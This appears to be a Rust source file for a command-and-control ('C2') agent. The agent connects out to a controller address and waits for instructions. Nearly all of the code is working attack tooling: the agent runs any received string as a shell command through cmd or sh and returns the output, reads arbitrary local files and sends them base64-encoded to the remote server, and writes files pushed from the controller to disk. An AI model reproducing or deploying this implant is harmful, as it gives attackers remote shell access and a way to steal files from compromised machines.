use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::process::Command;
use std::fs;
use base64::{Engine as _, engine::general_purpose};

pub async fn start_agent(server_ip: String, port: u16) {
    let addr = format!("{}:{}", server_ip, port);
    println!("\n[🎮] C2 Agent Starting...");
    println!("    📡 Connecting to Controller at: {}", addr);

    match TcpStream::connect(&addr).await {
        Ok(mut stream) => {
            println!("    ✅ Connected! Waiting for commands...");
            let (mut reader, mut writer) = stream.split();
            let mut buffer = vec![0; 10240000]; // 10MB Buffer

            loop {
                match reader.read(&mut buffer).await {
                    Ok(n) if n > 0 => {
                        let message = String::from_utf8_lossy(&buffer[..n]);
                        let command = message.trim();

                        if command == "exit" { break; }

                        // --- 1. RECEIVE UPLOAD FROM SERVER ---
                        if command.starts_with("UPLOAD:") {
                            let parts: Vec<&str> = command.splitn(3, ':').collect();
                            if parts.len() == 3 {
                                let filename = parts[1];
                                let b64_data = parts[2];
                                println!("    📥 Receiving file: {}", filename);

                                match general_purpose::STANDARD.decode(b64_data) {
                                    Ok(bytes) => {
                                        // 🔥 වෙනස: "downloads" ෆෝල්ඩර් එකට දානවා
                                        fs::create_dir_all("downloads").unwrap_or_default();
                                        let save_path = format!("downloads/{}", filename);

                                        match fs::write(&save_path, bytes) {
                                            Ok(_) => {
                                                let msg = format!("✅ Upload Complete! Saved to: {}", save_path);
                                                println!("    💾 File saved at: {}", save_path); // Agent එකටත් පේන්න දානවා
                                                let _ = writer.write_all(msg.as_bytes()).await;
                                            }
                                            Err(e) => {
                                                let msg = format!("❌ Write Failed: {}", e);
                                                let _ = writer.write_all(msg.as_bytes()).await;
                                            }
                                        }
                                    }
                                    Err(_) => {
                                         let _ = writer.write_all("❌ Decode Failed".as_bytes()).await;
                                    }
                                }
                            }
                            continue;
                        }

                        // --- 2. SEND DOWNLOAD TO SERVER ---
                        if command.starts_with("download ") {
                            let filename = command.strip_prefix("download ").unwrap().trim();
                            match fs::read(filename) {
                                Ok(content) => {
                                    let b64 = general_purpose::STANDARD.encode(content);
                                    let response = format!("FILE:{}:{}", filename, b64);
                                    let _ = writer.write_all(response.as_bytes()).await;
                                }
                                Err(e) => {
                                    let msg = format!("❌ File Read Error: {}", e);
                                    let _ = writer.write_all(msg.as_bytes()).await;
                                }
                            }
                            continue;
                        }

                        // --- 3. NORMAL SHELL ---
                        println!("    📥 Command: {}", command);
                        let output = if cfg!(target_os = "windows") {
                            Command::new("cmd").args(["/C", command]).output()
                        } else {
                            Command::new("sh").arg("-c").arg(command).output()
                        };

                        match output {
                            Ok(out) => {
                                let res = if out.status.success() {
                                    String::from_utf8_lossy(&out.stdout).to_string()
                                } else {
                                    String::from_utf8_lossy(&out.stderr).to_string()
                                };
                                let _ = writer.write_all(res.as_bytes()).await;
                            }
                            Err(e) => {
                                let _ = writer.write_all(format!("Error: {}", e).as_bytes()).await;
                            }
                        }
                    }
                    Ok(_) => break,
                    Err(_) => break,
                }
            }
        }
        Err(e) => println!("    ❌ Failed to connect: {}", e),
    }
}